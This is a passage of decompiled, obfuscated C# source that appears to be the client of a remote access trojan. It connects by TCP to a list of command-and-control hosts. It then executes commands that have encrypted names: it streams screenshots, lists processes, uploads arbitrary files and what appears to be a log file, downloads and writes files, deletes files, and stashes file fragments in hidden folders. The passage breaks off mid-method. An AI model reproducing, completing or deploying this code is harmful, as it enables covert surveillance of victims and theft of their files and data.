using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public sealed class GClass2
{
	private sealed class Class9
	{
		public string[] string_0;

		public GClass2 gclass2_0;

		internal void method_0()
		{
			gclass2_0.method_13(string_0[1]);
		}

		internal void method_1()
		{
			gclass2_0.gclass1_0.method_5(string_0[1], bool_0: false);
		}

		internal void method_2()
		{
			gclass2_0.method_18(string_0[1]);
		}

		internal void method_3()
		{
			gclass2_0.method_4(string_0[1]);
		}

		internal void method_4()
		{
			GClass2 gClass = gclass2_0;
			string text = string_0[1];
			char[] separator = new char[1] { '|' };
			string text2 = text.Split(separator)[0];
			string text3 = string_0[1];
			separator = new char[1] { '|' };
			gClass.method_19(text2, int.Parse(text3.Split(separator)[1]));
		}

		internal void method_5()
		{
			gclass2_0.class13_0.method_2(string_0[1]);
		}
	}

	private sealed class Class10
	{
		public string string_0;

		public string string_1;

		public Class9 class9_0;

		internal void method_0()
		{
			class9_0.gclass2_0.method_12(null, Class11.smethod_0(-2094343459).Split(new char[1] { '|' })[0] + string_0, bool_8: false);
		}

		internal void method_1()
		{
			class9_0.gclass2_0.method_12(null, Class11.smethod_0(-2094343428).Split(new char[1] { '!' })[0] + string_1, bool_8: false);
		}
	}

	private bool bool_0 = false;

	private Class13 class13_0 = new Class13();

	public DateTime dateTime_0;

	private int int_0 = 0;

	private int int_1 = 1024;

	public GClass1 gclass1_0;

	public GForm0 gform0_0;

	public bool bool_1 = false;

	private Class7 class7_0 = new Class7();

	public ProcessStartInfo processStartInfo_0;

	private bool bool_2 = false;

	private bool bool_3 = false;

	private bool bool_4 = false;

	public int int_2 = 0;

	private bool bool_5 = false;

	private int int_3 = 0;

	public Process process_0;

	private Dictionary<string, byte[]> dictionary_0 = new Dictionary<string, byte[]>();

	private Thread thread_0;

	public TcpClient tcpClient_0;

	private int int_4 = 0;

	public NetworkStream networkStream_0;

	public bool bool_6 = false;

	public bool bool_7 = false;

	private ThreadStart threadStart_0;

	private int int_5 = 210;

	public void method_0()
	{
		Class6.int_0 = Class6.int_1[0];
		gclass1_0 = new GClass1(this)
		{
			dateTime_0 = DateTime.Now
		};
		Class6.smethod_4();
		class13_0.gclass2_0 = this;
		TimerCallback callback = method_8;
		Timer timer_ = new Timer(callback, class7_0, 55000, 65000);
		class7_0.timer_0 = timer_;
		gclass1_0.method_9();
		Thread.Sleep(200);
		gclass1_0.method_10();
	}

	public string[] method_1()
	{
		try
		{
			byte[] array = new byte[5];
			int_4 = networkStream_0.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= int_4)
			{
				int_4 = networkStream_0.Read(array2, num2, (num3 > int_1) ? int_1 : num3);
				num2 += int_4;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (!(text.Trim() == string.Empty))
			{
				return text.ToLower().Split(new char[1] { '=' });
			}
			return null;
		}
		catch
		{
			bool_6 = false;
			return null;
		}
	}

	private void method_2(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(string_0), 210, 160);
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(string_0);
				string name = fileInfo.Name;
				char[] separator = new char[1] { '!' };
				string text = name + Class11.smethod_0(-2094343649).Split(separator)[0];
				string text2 = fileInfo.CreationTimeUtc.ToString();
				separator = new char[1] { '!' };
				text = text + text2 + Class11.smethod_0(-2094343649).Split(separator)[0];
				string text3 = gclass1_0.method_6(fileInfo.Length);
				separator = new char[1] { '!' };
				text = text + text3 + Class11.smethod_0(-2094343649).Split(separator)[0];
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Png());
				byte[] byte_ = memoryStream.ToArray();
				separator = new char[1] { '!' };
				method_12(byte_, Class11.smethod_0(-2094343636).Split(separator)[0] + text, bool_8: false);
			}
		}
		catch
		{
		}
	}

	private bool method_3()
	{
		try
		{
			Class6.string_15 = gclass1_0.method_12()[0];
			if (int_3 > 21)
			{
				Class6.string_15 = gclass1_0.method_12()[1];
				if (int_3 > 26)
				{
					int_3 = 0;
				}
			}
			int_3++;
			tcpClient_0 = new TcpClient();
			tcpClient_0.Connect(Class6.string_15, Class6.int_0);
			int_3 = 0;
			return true;
		}
		catch
		{
			method_10();
			return false;
		}
	}

	private void method_4(string string_0)
	{
		try
		{
			Class5 @class = new Class5();
			char[] separator = new char[1] { '>' };
			int_5 = Convert.ToInt16(string_0.Split(separator)[0].Trim());
			while (bool_2 && bool_6)
			{
				Bitmap val = @class.method_0(int_5);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					byte[] byte_ = memoryStream.ToArray();
					separator = new char[1] { '|' };
					method_12(byte_, Class11.smethod_0(-2094343615).Split(separator)[0], bool_8: false);
				}
			}
		}
		catch
		{
		}
	}

	private void method_5()
	{
		string text = class13_0.method_3();
		char[] separator = new char[1] { '!' };
		method_12(null, Class11.smethod_0(-2094343557).Split(separator)[0] + text, bool_8: false);
	}

	public void method_6()
	{
		try
		{
			string text = string.Empty;
			Process[] processes = Process.GetProcesses();
			char[] separator;
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				string text2 = processes[i].Id.ToString();
				separator = new char[1] { '|' };
				text = text + text2 + Class11.smethod_0(-2094343391).Split(separator)[0];
				string text3 = processes[i].ProcessName.ToString();
				separator = new char[1] { '!' };
				text = text + text3 + Class11.smethod_0(-2094343649).Split(separator)[0];
				separator = new char[1] { '|' };
				text += Class11.smethod_0(-2094343782).Split(separator)[0];
				separator = new char[1] { '!' };
				text += Class11.smethod_0(-2094343768).Split(separator)[0];
			}
			byte[] byte_ = Class6.smethod_0(text);
			separator = new char[1] { '|' };
			method_12(byte_, Class11.smethod_0(-2094343751).Split(separator)[0], bool_8: false);
		}
		catch
		{
		}
	}

	public void method_7()
	{
		try
		{
			Class6.smethod_2();
			char[] separator = new char[1] { '|' };
			_ = Class11.smethod_0(-2094343726).Split(separator)[0];
			separator = new char[1] { '|' };
			string string_ = Class11.smethod_0(-2094343706).Split(separator)[0];
			string text = Class6.smethod_2();
			string string_2 = Class6.string_8;
			separator = new char[1] { '|' };
			Class6.smethod_7(string_, text + string_2 + Class11.smethod_0(-2094343726).Split(separator)[0]);
		}
		catch
		{
		}
	}

	private void method_8(object object_0)
	{
		try
		{
			if (bool_0)
			{
				int_0++;
			}
			else
			{
				bool_0 = true;
				gclass1_0.method_1();
				if (!bool_6 || !tcpClient_0.Connected)
				{
					bool_6 = method_3();
					if (bool_6)
					{
						int_1 = tcpClient_0.ReceiveBufferSize;
						method_16();
					}
				}
			}
			bool_0 = false;
		}
		catch
		{
			int_3++;
			bool_0 = false;
			int_0 = 0;
			bool_4 = false;
			bool_6 = false;
			bool_3 = false;
		}
	}

	private void method_9()
	{
		try
		{
			string text = Class6.smethod_3();
			string string_ = Class6.string_5;
			char[] separator = new char[1] { '|' };
			if (!File.Exists(text + string_ + Class11.smethod_0(-2094343726).Split(separator)[0]))
			{
				return;
			}
			GClass1 gClass = gclass1_0;
			string text2 = Class6.smethod_3();
			string string_2 = Class6.string_5;
			separator = new char[1] { '|' };
			gClass.method_3(text2 + string_2 + Class11.smethod_0(-2094343726).Split(separator)[0]);
			int num = 0;
			while (true)
			{
				if (num < 10)
				{
					if (File.Exists(Class6.smethod_3() + Class6.string_5))
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			byte[] byte_ = File.ReadAllBytes(Class6.smethod_3() + Class6.string_5);
			separator = new char[1] { '|' };
			method_12(byte_, Class11.smethod_0(-2094343925).Split(separator)[0], bool_8: false);
		}
		catch
		{
		}
	}

	public void method_10()
	{
		int_2++;
		Class6.int_0 = Class6.int_1[int_2];
		if (int_2 >= Class6.int_1.Length - 1)
		{
			int_2 = 0;
		}
	}

	public byte[] method_11()
	{
		try
		{
			gclass1_0.dateTime_0 = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			int_4 = networkStream_0.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !bool_1)
			{
				int_4 = networkStream_0.Read(array2, num, (num3 > int_1) ? int_1 : num3);
				num += int_4;
				num3 -= int_4;
				gclass1_0.dateTime_0 = DateTime.Now;
			}
			if (bool_1)
			{
				networkStream_0.Flush();
				array2 = null;
			}
			return array2;
		}
		catch
		{
			bool_6 = false;
			return null;
		}
	}

	public bool method_12(byte[] byte_0, string string_0, bool bool_8)
	{
		try
		{
			gclass1_0.dateTime_0 = DateTime.Now;
			if (!bool_4)
			{
				bool_4 = true;
				byte[] array = Class6.smethod_0(string_0);
				int num = 0;
				int num2 = 5;
				byte[] array2 = null;
				if (byte_0 != null)
				{
					array2 = BitConverter.GetBytes(byte_0.Length);
					num = byte_0.Length;
					num2 = 10;
				}
				byte[] bytes = BitConverter.GetBytes(array.Length);
				byte[] array3 = new byte[num2 + array.Length + num];
				bytes.CopyTo(array3, 0);
				array.CopyTo(array3, 5);
				if (byte_0 != null)
				{
					array2.CopyTo(array3, 5 + array.Length);
					byte_0.CopyTo(array3, 10 + array.Length);
				}
				int num3 = 0;
				int num4 = array3.Length;
				while (num4 > 0 && !bool_1)
				{
					int num5 = ((num4 > int_1) ? int_1 : num4);
					networkStream_0.Write(array3, num3, num5);
					num3 += num5;
					num4 -= num5;
					gclass1_0.dateTime_0 = DateTime.Now;
				}
				bool_4 = false;
				return (!bool_1) ? true : false;
			}
			return false;
		}
		catch
		{
			bool_4 = false;
			bool_6 = false;
			return false;
		}
	}

	private void method_13(string string_0)
	{
		try
		{
			if (File.Exists(string_0))
			{
				string fileName = Path.GetFileName(string_0);
				byte[] byte_ = File.ReadAllBytes(string_0);
				char[] separator = new char[1] { '!' };
				method_12(byte_, Class11.smethod_0(-2094343892).Split(separator)[0] + string_0 + Class11.smethod_0(-2094343857) + fileName, bool_8: true);
			}
		}
		catch
		{
		}
	}

	public void method_14(string string_0)
	{
		try
		{
			File.Delete(string_0);
		}
		catch
		{
		}
	}

	public void method_15(string string_0)
	{
		try
		{
			byte[] array = method_11();
			if (array != null)
			{
				File.WriteAllBytes(string_0, array);
			}
		}
		catch
		{
		}
	}

	private void method_16()
	{
		if (!bool_3)
		{
			bool_3 = true;
			networkStream_0 = gclass1_0.method_7(tcpClient_0);
			bool_2 = false;
			while (bool_6)
			{
				Class9 @class = new Class9();
				@class.gclass2_0 = this;
				@class.string_0 = method_1();
				string text;
				Class10 class2;
				char[] separator;
				if (@class.string_0 != null)
				{
					bool_1 = false;
					text = @class.string_0[0];
					separator = new char[1] { '-' };
					string empty = string.Empty;
					if (text.Split(separator).Length <= 1)
					{
						separator = new char[1] { '!' };
						empty = text.Insert(2, Class11.smethod_0(-2094343483));
						empty = Class11.smethod_0(-2094343867).Split(separator)[0] + empty;
					}
					else
					{
						separator = new char[1] { '!' };
						string text2 = Class11.smethod_0(-2094343867).Split(separator)[0];
						separator = new char[1] { '-' };
						empty = text.Split(separator)[1];
						empty = empty.Insert(2, Class11.smethod_0(-2094343483));
						text = text2 + empty;
					}
					if (empty == null)
					{
						continue;
					}
					class2 = new Class10();
					class2.class9_0 = @class;
					string text3 = empty;
					string text4 = text3;
					uint num = Class4.smethod_0(text4);
					if (num <= 2292815861u)
					{
						if (num > 942265464)
						{
							if (num <= 1491403184)
							{
								if (num <= 1277817844)
								{
									if (num <= 1087371178)
									{
										if (num != 1036161308)
										{
											if (num != 1087371178 || !(text4 == Class11.smethod_0(-2094342621)))
											{
												continue;
											}
											goto IL_0500;
										}
										if (!(text4 == Class11.smethod_0(-2094342788)))
										{
											continue;
										}
										goto IL_0ec5;
									}
									if (num != 1255291034)
									{
										if (num != 1277817844 || !(text4 == Class11.smethod_0(-2094342929)))
										{
											continue;
										}
										goto IL_0550;
									}
									if (!(text4 == Class11.smethod_0(-2094342222)))
									{
										continue;
									}
									goto IL_057d;
								}
								if (num > 1363230341)
								{
									if (num != 1437111177)
									{
										if (num != 1491403184 || !(text4 == Class11.smethod_0(-2094342272)))
										{
											continue;
										}
										goto IL_0e11;
									}
									if (!(text4 == Class11.smethod_0(-2094342582)))
									{
										continue;
									}
									goto IL_0f7a;
								}
								if (num == 1283507186)
								{
									if (!(text4 == Class11.smethod_0(-2094342465)))
									{
										continue;
									}
									goto IL_0ad8;
								}
								if (num != 1363230341 || !(text4 == Class11.smethod_0(-2094342182)))
								{
									continue;
								}
							}
							else
							{
								if (num > 1903846304)
								{
									if (num <= 2104001597)
									{
										if (num != 1978491743)
										{
											if (num != 2104001597 || !(text4 == Class11.smethod_0(-2094345262)))
											{
												continue;
											}
											goto IL_0f2d;
										}
										if (!(text4 == Class11.smethod_0(-2094344115)))
										{
											continue;
										}
										goto IL_08c1;
									}
									if (num != 2154401398u)
									{
										if (num != 2292815861u || !(text4 == Class11.smethod_0(-2094345243)))
										{
											continue;
										}
										goto IL_075a;
									}
									if (!(text4 == Class11.smethod_0(-2094342892)))
									{
										continue;
									}
									goto IL_07a8;
								}
								if (num > 1618014263)
								{
									if (num != 1770730854)
									{
										if (num != 1903846304 || !(text4 == Class11.smethod_0(-2094343986)))
										{
											continue;
										}
										goto IL_0bfd;
									}
									if (!(text4 == Class11.smethod_0(-2094342726)))
									{
										continue;
									}
									goto IL_0c99;
								}
								if (num != 1607092888)
								{
									if (num != 1618014263 || !(text4 == Class11.smethod_0(-2094343124)))
									{
										continue;
									}
									goto IL_0c41;
								}
								if (!(text4 == Class11.smethod_0(-2094342163)))
								{
									continue;
								}
							}
							processStartInfo_0 = null;
							process_0 = null;
							continue;
						}
						if (num > 401633978)
						{
							if (num <= 733604318)
							{
								if (num <= 508289125)
								{
									if (num != 451524195)
									{
										if (num != 508289125 || !(text4 == Class11.smethod_0(-2094344133)))
										{
											continue;
										}
										goto IL_0355;
									}
									if (!(text4 == Class11.smethod_0(-2094342229)))
									{
										continue;
									}
									goto IL_057d;
								}
								if (num != 700051785)
								{
									if (num != 733604318 || !(text4 == Class11.smethod_0(-2094343113)))
									{
										continue;
									}
									goto IL_1025;
								}
								if (!(text4 == Class11.smethod_0(-2094345306)))
								{
									continue;
								}
								goto IL_0b69;
							}
							if (num <= 812412839)
							{
								if (num != 809688424)
								{
									if (num != 812412839 || !(text4 == Class11.smethod_0(-2094343838)))
									{
										continue;
									}
									goto IL_093f;
								}
								if (!(text4 == Class11.smethod_0(-2094345458)))
								{
									continue;
								}
								goto IL_075a;
							}
							if (num != 850368653)
							{
								if (num != 942265464 || !(text4 == Class11.smethod_0(-2094342697)))
								{
									continue;
								}
								goto IL_0fd1;
							}
							if (!(text4 == Class11.smethod_0(-2094342910)))
							{
								continue;
							}
							goto IL_07a8;
						}
						if (num > 181968713)
						{
							if (num <= 372366242)
							{
								if (num != 357143459)
								{
									if (num != 372366242 || !(text4 == Class11.smethod_0(-2094344170)))
									{
										continue;
									}
									goto IL_0355;
								}
								if (!(text4 == Class11.smethod_0(-2094342971)))
								{
									continue;
								}
							}
							else
							{
								if (num != 389290956)
								{
									if (num != 401633978 || !(text4 == Class11.smethod_0(-2094342322)))
									{
										continue;
									}
									goto IL_099b;
								}
								if (!(text4 == Class11.smethod_0(-2094342992)))
								{
									continue;
								}
							}
							class2.string_1 = class13_0.method_4(class2.class9_0.string_0[1]);
							if (class2.string_1 != string.Empty)
							{
								threadStart_0 = class2.method_1;
								thread_0 = new Thread(threadStart_0);
								thread_0.Start();
							}
							continue;
						}
						if (num <= 181381576)
						{
							if (num != 13202321)
							{
								if (num != 181381576 || !(text4 == Class11.smethod_0(-2094342849)))
								{
									continue;
								}
								goto IL_0903;
							}
							if (!(text4 == Class11.smethod_0(-2094342631)))
							{
								continue;
							}
							goto IL_0500;
						}
						if (num != 181494086)
						{
							if (num != 181968713 || !(text4 == Class11.smethod_0(-2094342928)))
							{
								continue;
							}
							goto IL_0550;
						}
						if (!(text4 == Class11.smethod_0(-2094342770)))
						{
							continue;
						}
					}
					else
					{
						if (num <= 3145467607u)
						{
							if (num <= 2678099802u)
							{
								if (num <= 2544693647u)
								{
									if (num <= 2515643766u)
									{
										if (num != 2413394671u)
										{
											if (num != 2515643766u || !(text4 == Class11.smethod_0(-2094342319)))
											{
												continue;
											}
										}
										else if (!(text4 == Class11.smethod_0(-2094342277)))
										{
											continue;
										}
										threadStart_0 = method_26;
										thread_0 = new Thread(threadStart_0);
										thread_0.Start();
										continue;
									}
									if (num != 2531105650u)
									{
										if (num != 2544693647u || !(text4 == Class11.smethod_0(-2094343963)))
										{
											continue;
										}
										goto IL_0bd8;
									}
									if (!(text4 == Class11.smethod_0(-2094344105)))
									{
										continue;
									}
									goto IL_08c1;
								}
								if (num <= 2643662413u)
								{
									if (num != 2635023582u)
									{
										if (num != 2643662413u || !(text4 == Class11.smethod_0(-2094342848)))
										{
											continue;
										}
										goto IL_0903;
									}
									if (!(text4 == Class11.smethod_0(-2094344054)))
									{
										continue;
									}
									goto IL_093f;
								}
								if (num == 2665148291u)
								{
									if (!(text4 == Class11.smethod_0(-2094342364)))
									{
										continue;
									}
									goto IL_099b;
								}
								if (num != 2678099802u || !(text4 == Class11.smethod_0(-2094344045)))
								{
									continue;
								}
							}
							else
							{
								if (num > 2893642888u)
								{
									if (num <= 3009958385u)
									{
										if (num != 3009954078u)
										{
											if (num != 3009958385u || !(text4 == Class11.smethod_0(-2094342457)))
											{
												continue;
											}
											goto IL_0ad8;
										}
										if (!(text4 == Class11.smethod_0(-2094342526)))
										{
											continue;
										}
										goto IL_0ffe;
									}
									if (num != 3056641516u)
									{
										if (num != 3145467607u || !(text4 == Class11.smethod_0(-2094342420)))
										{
											continue;
										}
										goto IL_0d4c;
									}
									if (!(text4 == Class11.smethod_0(-2094345315)))
									{
										continue;
									}
									goto IL_0b69;
								}
								if (num <= 2835954156u)
								{
									if (num != 2812180893u)
									{
										if (num != 2835954156u || !(text4 == Class11.smethod_0(-2094342768)))
										{
											continue;
										}
										goto IL_0f7a;
									}
									if (!(text4 == Class11.smethod_0(-2094343033)))
									{
										continue;
									}
									goto IL_0e71;
								}
								if (num != 2856010935u)
								{
									if (num != 2893642888u || !(text4 == Class11.smethod_0(-2094345333)))
									{
										continue;
									}
									goto IL_0d79;
								}
								if (!(text4 == Class11.smethod_0(-2094344028)))
								{
									continue;
								}
							}
							threadStart_0 = class2.class9_0.method_0;
							thread_0 = new Thread(threadStart_0);
							thread_0.Start();
							continue;
						}
						if (num <= 3572559454u)
						{
							if (num <= 3287096296u)
							{
								if (num <= 3169640910u)
								{
									if (num != 3157432809u)
									{
										if (num != 3169640910u || !(text4 == Class11.smethod_0(-2094344177)))
										{
											continue;
										}
										goto IL_0bd8;
									}
									if (!(text4 == Class11.smethod_0(-2094343981)))
									{
										continue;
									}
									goto IL_0bfd;
								}
								if (num != 3228554337u)
								{
									if (num != 3287096296u || !(text4 == Class11.smethod_0(-2094343142)))
									{
										continue;
									}
									goto IL_0c41;
								}
								if (!(text4 == Class11.smethod_0(-2094342708)))
								{
									continue;
								}
								goto IL_0c99;
							}
							if (num > 3410359212u)
							{
								if (num != 3415173161u)
								{
									if (num != 3572559454u || !(text4 == Class11.smethod_0(-2094342410)))
									{
										continue;
									}
									goto IL_0d4c;
								}
								if (!(text4 == Class11.smethod_0(-2094343066)))
								{
									continue;
								}
								goto IL_0d79;
							}
							if (num == 3305020861u)
							{
								if (!(text4 == Class11.smethod_0(-2094342155)))
								{
									continue;
								}
								goto IL_0dc9;
							}
							if (num != 3410359212u || !(text4 == Class11.smethod_0(-2094342563)))
							{
								continue;
							}
						}
						else
						{
							if (num <= 3906434548u)
							{
								if (num <= 3649843312u)
								{
									if (num != 3620701515u)
									{
										if (num != 3649843312u || !(text4 == Class11.smethod_0(-2094342372)))
										{
											continue;
										}
										goto IL_0dc9;
									}
									if (!(text4 == Class11.smethod_0(-2094344066)))
									{
										continue;
									}
									goto IL_0e11;
								}
								if (num != 3803285091u)
								{
									if (num != 3906434548u || !(text4 == Class11.smethod_0(-2094342999)))
									{
										continue;
									}
									goto IL_0e71;
								}
								if (!(text4 == Class11.smethod_0(-2094342806)))
								{
									continue;
								}
								goto IL_0ec5;
							}
							if (num > 4086469742u)
							{
								if (num != 4087546025u)
								{
									if (num != 4142437219u)
									{
										if (num != 4275604581u || !(text4 == Class11.smethod_0(-2094342664)))
										{
											continue;
										}
										goto IL_0fd1;
									}
									if (!(text4 == Class11.smethod_0(-2094342508)))
									{
										continue;
									}
									goto IL_0ffe;
								}
								if (!(text4 == Class11.smethod_0(-2094343074)))
								{
									continue;
								}
								goto IL_1025;
							}
							if (num != 4007482236u)
							{
								if (num != 4086469742u || !(text4 == Class11.smethod_0(-2094345272)))
								{
									continue;
								}
								goto IL_0f2d;
							}
							if (!(text4 == Class11.smethod_0(-2094342556)))
							{
								continue;
							}
						}
					}
					goto IL_0f7a;
				}
				bool_6 = false;
				break;
				IL_057d:
				gclass1_0.dateTime_0 = DateTime.Now;
				continue;
				IL_0ad8:
				threadStart_0 = method_27;
				thread_0 = new Thread(threadStart_0);
				thread_0.Start();
				continue;
				IL_093f:
				method_17(class2.class9_0.string_0[1]);
				continue;
				IL_08c1:
				gclass1_0.method_11();
				continue;
				IL_0c99:
				threadStart_0 = class2.class9_0.method_1;
				thread_0 = new Thread(threadStart_0);
				thread_0.Start();
				continue;
				IL_07a8:
				threadStart_0 = class2.class9_0.method_2;
				thread_0 = new Thread(threadStart_0);
				thread_0.Start();
				continue;
				IL_0355:
				class2.string_0 = class13_0.method_1(class2.class9_0.string_0[1]);
				if (class2.string_0 != string.Empty)
				{
					threadStart_0 = class2.method_0;
					thread_0 = new Thread(threadStart_0);
					thread_0.Start();
				}
				continue;
				IL_075a:
				GClass1 gClass = gclass1_0;
				string text5 = class2.class9_0.string_0[1];
				separator = new char[1] { '>' };
				gClass.method_3(text5.Split(separator)[0]);
				continue;
				IL_0fd1:
				method_15(class2.class9_0.string_0[1]);
				continue;
				IL_099b:
				threadStart_0 = method_25;
				thread_0 = new Thread(threadStart_0);
				thread_0.Start();
				continue;
				IL_0b69:
				thread_0 = new Thread(method_23);
				thread_0.Start();
				continue;
				IL_0bd8:
				gclass1_0.method_9();
				continue;
				IL_0d79:
				gclass1_0.method_8();
				continue;
				IL_1025:
				string text6 = class2.class9_0.string_0[1];
				separator = new char[1] { '|' };
				if (text6.Split(separator).Length == 2)
				{
					threadStart_0 = class2.class9_0.method_4;
					thread_0 = new Thread(threadStart_0);
					thread_0.Start();
				}
				continue;
				IL_0dc9:
				threadStart_0 = method_24;
				thread_0 = new Thread(threadStart_0);
				thread_0.Start();
				continue;
				IL_0bfd:
				bool_7 = true;
				bool_1 = true;
				bool_2 = false;
				continue;
				IL_0d4c:
				method_20(class2.class9_0.string_0[1]);
				continue;
				IL_0f7a:
				gclass1_0.method_4(text, class2.class9_0.string_0[1], gform0_0);
				continue;
				IL_0550:
				method_15(class2.class9_0.string_0[1]);
				continue;
				IL_0ffe:
				method_2(class2.class9_0.string_0[1]);
				continue;
				IL_0f2d:
				threadStart_0 = class2.class9_0.method_5;
				thread_0 = new Thread(threadStart_0);
				thread_0.Start();
				continue;
				IL_0903:
				thread_0 = new Thread(method_5);
				thread_0.Start();
				continue;
				IL_0e11:
				separator = new char[1] { '!' };
				method_12(null, Class11.smethod_0(-2094345456).Split(separator)[0] + Class6.smethod_2(), bool_8: false);
				continue;
				IL_0e71:
				bool_2 = true;
				threadStart_0 = class2.class9_0.method_3;
				thread_0 = new Thread(threadStart_0);
				thread_0.Start();
				continue;
				IL_0500:
				bool_2 = false;
				continue;
				IL_0ec5:
				threadStart_0 = method_28;
				thread_0 = new Thread(threadStart_0);
				thread_0.Start();
				continue;
				IL_0c41:
				string text7 = class2.class9_0.string_0[1];
				separator = new char[1] { '|' };
				string[] array = text7.Split(separator);
				gclass1_0.method_0(Convert.ToInt16(array[0].Trim()));
			}
			bool_6 = false;
			bool_2 = false;
		}
		bool_3 = false;
	}

	private void method_17(string string_0)
	{
		try
		{
			Class5 @class = new Class5();
			char[] separator = new char[1] { '>' };
			int_5 = Convert.ToInt16(string_0.Split(separator)[0].Trim());
			Bitmap val = @class.method_0(int_5);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				byte[] byte_ = memoryStream.ToArray();
				separator = new char[1] { '!' };
				method_12(byte_, Class11.smethod_0(-2094345424).Split(separator)[0], bool_8: false);
			}
		}
		catch
		{
		}
	}

	public bool method_18(string string_0)
	{
		try
		{
			char[] separator = new char[1] { '>' };
			string path = string_0.Split(separator)[0];
			if (!File.Exists(path))
			{
				method_12(null, Class11.smethod_0(-2094345366) + string_0, bool_8: false);
				return false;
			}
			string fileName = Path.GetFileName(path);
			byte[] byte_ = File.ReadAllBytes(path);
			string_0 = string_0 + Class11.smethod_0(-2094345347) + fileName;
			separator = new char[1] { '!' };
			method_12(byte_, Class11.smethod_0(-2094345355).Split(separator)[0] + string_0, bool_8: false);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public bool method_19(string string_0, int int_6)
	{
		bool result = false;
		try
		{
			List<string> list = new List<string>();
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read);
			int num = (int)Math.Ceiling((double)fileStream.Length / (double)int_6);
			string directoryName = Path.GetDirectoryName(string_0);
			char[] separator = new char[1] { '!' };
			string oldValue = Class11.smethod_0(-2094345579).Split(separator)[0];
			separator = new char[1] { '!' };
			string text = directoryName + Class11.smethod_0(-2094345541).Replace(oldValue, Class11.smethod_0(-2094345547).Split(separator)[0]);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			}
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(string_0);
			string extension = Path.GetExtension(string_0);
			for (int i = 0; i < int_6; i++)
			{
				string[] array = new string[7] { text, null, null, null, null, null, null };
				separator = new char[1] { '!' };
				array[1] = Class11.smethod_0(-2094345547).Split(separator)[0];
				array[2] = fileNameWithoutExtension;
				separator = new char[1] { '!' };
				array[3] = Class11.smethod_0(-2094345510).Split(separator)[0];
				array[4] = i.ToString().PadLeft(5, Convert.ToChar(Class11.smethod_0(-2094343483)));
				array[5] = extension;
				separator = new char[1] { '!' };
				array[6] = Class11.smethod_0(-2094345493).Split(separator)[0];
				FileStream fileStream2 = new FileStream(string.Concat(array), FileMode.Create, FileAccess.Write);
				int num2 = 0;
				byte[] buffer = new byte[num];
				int num3 = fileStream.Read(buffer, 0, num);
				num2 = num3;
				if (num3 > 0)
				{
					fileStream2.Write(buffer, 0, num2);
					string item = fileNameWithoutExtension + Class11.smethod_0(-2094345473) + i.ToString().PadLeft(3, Convert.ToChar(Class11.smethod_0(-2094343483))) + extension.ToString();
					list.Add(item);
				}
				fileStream2.Close();
			}
			fileStream.Close();
			return result;
		}
		catch
		{
			return result;
		}
	}

	private void method_20(string string_0)
	{
		try
		{
			string[] array = string_0.Split(new char[1] { '>' });
			int_5 = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void method_21()
	{
		try
		{
			byte[] byte_ = Class6.smethod_1();
			char[] separator = new char[1] { '|' };
			method_12(byte_, Class11.smethod_0(-2094345481).Split(separator)[0], bool_8: false);
		}
		catch
		{
		}
	}

	private void method_22(string string_0)
	{
		try
		{
			if (!File.Exists(Class6.smethod_5() + Class6.string_7))
			{
				return;
			}
			string fileName = Path.GetFileName(Class6.smethod_5() + Class6.string_7);
			DateTime lastWriteTimeUtc = File.GetLastWriteTimeUtc(Class6.smethod_5() + Class6.string_7);
			char[] separator = new char[1] { '|' };
			_ = Class11.smethod_0(-2094345687).Split(separator)[0];
			string path = Class6.smethod_5() + Class6.string_7;
			byte[] array;
			using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using StreamReader streamReader = new StreamReader(stream);
				array = Class6.smethod_0(streamReader.ReadToEnd());
			}
			if (array.Length != 0)
			{
				separator = new char[1] { '|' };
				method_12(array, Class11.smethod_0(-2094345678) + string_0 + Class11.smethod_0(-2094345662).Split(separator)[0] + fileName, bool_8: false);
			}
			dateTime_0 = lastWriteTimeUtc;
		}
		catch
		{
		}
	}

	private void method_23()
	{
		string[] array = new string[12]
		{
			Class6.string_13,
			Class11.smethod_0(-2094345645),
			Class6.string_11,
			Class11.smethod_0(-2094345645),
			Class6.string_12,
			Class11.smethod_0(-2094345645),
			Class6.string_14,
			Class11.smethod_0(-2094345645),
			Class6.smethod_6(),
			Class11.smethod_0(-2094345645),
			Class6.string_10,
			Class11.smethod_0(-2094345645)
		};
		string text = string.Concat(string.Concat(array), Class11.smethod_0(-2094345621));
		array = new string[5]
		{
			text,
			Class11.smethod_0(-2094345645),
			Class6.smethod_2(),
			Class11.smethod_0(-2094345645),
			Class6.string_8
		};
		byte[] byte_ = Class6.smethod_0(string.Concat(array));
		char[] separator = new char[1] { '|' };
		method_12(byte_, Class11.smethod_0(-2094345632).Split(separator)[0], bool_8: false);
		if (!bool_5 && Directory.Exists(Class6.smethod_8() + Class6.string_3))
		{
			bool_5 = true;
		}
		if (bool_5)
		{
			method_12(null, Class11.smethod_0(-2094345852) + Class6.smethod_8() + Class6.string_3, bool_8: false);
		}
